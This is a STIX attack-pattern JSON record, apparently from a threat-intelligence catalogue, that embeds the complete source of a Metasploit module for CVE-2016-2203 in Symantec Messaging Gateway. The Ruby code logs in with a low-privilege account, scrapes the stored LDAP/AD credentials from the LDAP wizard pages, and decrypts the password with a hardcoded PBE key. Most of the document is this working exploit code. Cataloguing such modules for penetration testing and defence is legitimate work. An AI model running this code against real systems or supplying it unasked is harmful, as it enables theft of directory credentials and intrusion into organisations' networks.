{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a8dae6d1-c763-4182-b07d-f829594b79d1",
    "created": "2024-08-14T16:29:35.639955Z",
    "modified": "2024-08-14T16:29:35.639959Z",
    "name": "Symantec Messaging Gateway 10 Exposure of Stored AD Password Vulnerability",
    "description": " This module will grab the AD account saved in Symantec Messaging Gateway and then decipher it using the disclosed Symantec PBE key.  Note that authentication is required in order to successfully grab the LDAP credentials, and you need at least a read account. Version 10.6.0-7 and earlier are affected  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/symantec_brightmail_ldapcreds.rb",
            "external_id": "symantec_brightmail_ldapcreds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'digest'\nrequire \"openssl\"\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Symantec Messaging Gateway 10 Exposure of Stored AD Password Vulnerability',\n      'Description'    => %q{\n        This module will grab the AD account saved in Symantec Messaging Gateway and then\n        decipher it using the disclosed Symantec PBE key.  Note that authentication is required\n        in order to successfully grab the LDAP credentials, and you need at least a read account.\n        Version 10.6.0-7 and earlier are affected\n      },\n      'References'     =>\n        [\n          ['URL','https://www.broadcom.com/support/security-center/securityupdates/detail?fid=security_advisory&pvid=security_advisory&suid=20160418_00&year='],\n          ['CVE','2016-2203'],\n          ['BID','86137']\n        ],\n      'Author'         =>\n        [\n          'Fakhir Karim Reda <karim.fakhir[at]gmail.com>'\n        ],\n       'DefaultOptions' =>\n        {\n          'SSL' => true,\n          'SSLVersion' => 'TLS1',\n          'RPORT' => 443\n        },\n       'License'        => MSF_LICENSE,\n       'DisclosureDate' => '2015-12-17'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [true, 'The username to login as']),\n        OptString.new('PASSWORD', [true, 'The password to login with']),\n        OptString.new('TARGETURI', [true, 'The base path to Symantec Messaging Gateway', '/'])\n      ])\n  end\n\n  def print_status(msg='')\n    super(rhost ? \"#{peer} - #{msg}\" : msg)\n  end\n\n  def print_good(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_error(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def report_cred(opts)\n   service_data = {\n    address: opts[:ip],\n    port: opts[:port],\n    service_name: 'LDAP',\n    protocol: 'tcp',\n    workspace_id: myworkspace_id\n   }\n   credential_data = {\n    origin_type: :service,\n    module_fullname: fullname,\n    username: opts[:user],\n    private_data: opts[:password],\n    private_type: :password\n   }.merge(service_data)\n   login_data = {\n    last_attempted_at: DateTime.now,\n    core: create_credential(credential_data),\n    status: Metasploit::Model::Login::Status::SUCCESSFUL,\n    proof: opts[:proof]\n   }.merge(service_data)\n\n   create_credential_login(login_data)\n  end\n\n  def auth(username, password, sid, last_login)\n    sid2 = ''\n\n    res = send_request_cgi!({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'brightmail', 'login.do'),\n      'headers'   => {\n        'Referer' => \"https://#{peer}/brightmail/viewLogin.do\",\n        'Connection' => 'keep-alive'\n      },\n      'cookie'    => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}\",\n      'vars_post' => {\n        'lastlogin'  => last_login,\n        'userLocale' => '',\n        'lang'       => 'en_US',\n        'username'   => username,\n        'password'   => password,\n        'loginBtn'   => 'Login'\n      }\n    })\n\n   if res &&res.body =~ /Logged in/\n      sid2 = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0]\n      return sid2\n   end\n\n   nil\n  end\n\n  def get_login_data\n    sid        = ''  #From cookie\n    last_login = ''  #A hidden field in the login page\n\n    res = send_request_raw({\n      'uri' => normalize_uri(target_uri.path, 'brightmail', 'viewLogin.do')\n    })\n\n    if res\n      last_login = res.get_hidden_inputs.first['lastlogin'] || ''\n\n      unless res.get_cookies.empty?\n        sid = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || ''\n      end\n    end\n\n    return sid, last_login\n  end\n\n\n  # Returns the status of the listening port.\n  #\n  # @return [Boolean] TrueClass if port open, otherwise FalseClass.\n  def port_open?\n    begin\n      res = send_request_raw({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path)\n      })\n\n      return true if res\n    rescue ::Rex::ConnectionRefused\n      print_status(\"Connection refused\")\n    rescue ::Rex::ConnectionError\n      print_error(\"Connection failed\")\n    rescue ::OpenSSL::SSL::SSLError\n      print_error(\"SSL/TLS connection error\")\n    end\n\n    false\n  end\n\n  # Returns the derived key from the password, the salt and the iteration count number.\n  #\n  # @return Array of byte containing the derived key.\n  def get_derived_key(password, salt, count)\n    key = password + salt\n\n    for i in 0..count-1\n        key = Digest::MD5.digest(key)\n    end\n\n    kl = key.length\n\n    return key[0,8], key[8,kl]\n  end\n\n  # Returns the decoded Base64 data in RFC-4648 implementation.\n  # The Rex implementation decoding Base64 is by using unpack(\"m\").\n  # By default, the \"m\" directive uses RFC-2045, but if followed by 0,\n  # it uses RFC-4648, which is the same RFC Base64.strict_decode64 uses.\n  def strict_decode64(str)\n    \"#{Rex::Text.decode_base64(str)}0\"\n  end\n\n\n  # @Return the deciphered password\n  # Algorithm obtained by reversing the firmware\n  def decrypt(enc_str)\n    pbe_key = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,./<>?;':\\\"\\\\{}`~!@#$%^&*()_+-=\"\n    salt = strict_decode64(enc_str[0,12])\n    remsg = strict_decode64(enc_str[12,enc_str.length])\n    (dk, iv) = get_derived_key(pbe_key, salt, 1000)\n    alg = 'des-cbc'\n\n    decode_cipher = OpenSSL::Cipher.new(alg)\n    decode_cipher.decrypt\n    decode_cipher.padding = 0\n    decode_cipher.key = dk\n    decode_cipher.iv = iv\n    plain = decode_cipher.update(remsg)\n    plain << decode_cipher.final\n\n    plain.gsub(/[\\x01-\\x08]/,'')\n  end\n\n\n  def grab_auths(sid,last_login)\n    token         = '' # from hidden input\n    selected_ldap = '' # from checkbox input\n    new_uri       = '' # redirection\n    flow_id       = '' # id of the flow\n    folder        = '' # symantec folder\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, '/brightmail/setting/ldap/LdapWizardFlow$exec.flo'),\n      'headers'   => {\n        'Referer' => \"https://#{peer}/brightmail/setting/ldap/LdapWizardFlow$exec.flo\",\n        'Connection' => 'keep-alive'\n      },\n      'cookie'    => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid};\"\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while getting token to authenticate.')\n    end\n\n    token = res.get_hidden_inputs.first['symantec.brightmail.key.TOKEN'] || ''\n\n    res = send_request_cgi({\n      'method'       => 'POST',\n      'uri'          => normalize_uri(target_uri.path, '/brightmail/setting/ldap/LdapWizardFlow$edit.flo'),\n      'cookie'       => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}; \",\n      'vars_post'    =>\n        {\n          'flowId'     => '0',\n          'userLocale' => '',\n          'lang'       => 'en_US',\n          'symantec.brightmail.key.TOKEN'=> \"#{token}\"\n        },\n      'headers'      =>\n        {\n          'Referer' => \"https://#{peer}/brightmail/setting/ldap/LdapWizardFlow$exec.flo\",\n          'Connection' => 'keep-alive'\n        }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while attempting to authenticate.')\n    end\n\n    if res.headers['Location']\n      mlocation = res.headers['Location']\n      new_uri = res.headers['Location'].scan(/^https:\\/\\/[\\d\\.]+(\\/.+)/).flatten[0]\n      flow_id =  new_uri.scan(/.*\\?flowId=(.+)/).flatten[0]\n      folder = new_uri.scan(/(.*)\\?flowId=.*/).flatten[0]\n    end\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => \"#{folder}\",\n      'headers'   => {\n        'Referer' => \"https://#{peer}/brightmail/setting/ldap/LdapWizardFlow$exec.flo\",\n        'Connection' => 'keep-alive'\n      },\n      'cookie'    => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}; \",\n      'vars_get'  => {\n      'flowId'  => \"#{flow_id}\",\n      'userLocale' => '',\n      'lang'       => 'en_US'\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while trying to collect credentials.')\n    end\n\n    if res.code == 200\n      login = res.body.scan(/<input type=\"text\" name=\"userName\".*value=\"(.+)\"\\/>/).flatten[0] || ''\n      password = res.body.scan(/<input type=\"password\" name=\"password\".*value=\"(.+)\"\\/>/).flatten[0] || ''\n      host =  res.body.scan(/<input name=\"host\" id=\"host\" type=\"text\" value=\"(.+)\" class/).flatten[0] || ''\n      port =  res.body.scan(/<input name=\"port\" id=\"port\" type=\"text\" value=\"(.+)\" class/).flatten[0] || ''\n      password = decrypt(password)\n      print_good(\"Found login = '#{login}' password = '#{password}' host ='#{host}' port = '#{port}' \")\n      report_cred(ip: host, port: port, user:login, password: password, proof: res.code.to_s)\n    end\n  end\n\n  def run_host(ip)\n    unless port_open?\n      print_status(\"Port is not open.\")\n    end\n\n    sid, last_login = get_login_data\n\n    if sid.empty? || last_login.empty?\n      print_error(\"Missing required login data.  Cannot continue.\")\n      return\n    end\n\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n    sid = auth(username, password, sid, last_login)\n\n    if sid\n      print_good(\"Logged in as '#{username}:#{password}' Sid: '#{sid}' LastLogin '#{last_login}'\")\n      grab_auths(sid,last_login)\n    else\n      print_error(\"Unable to login.  Cannot continue.\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-12-17"
}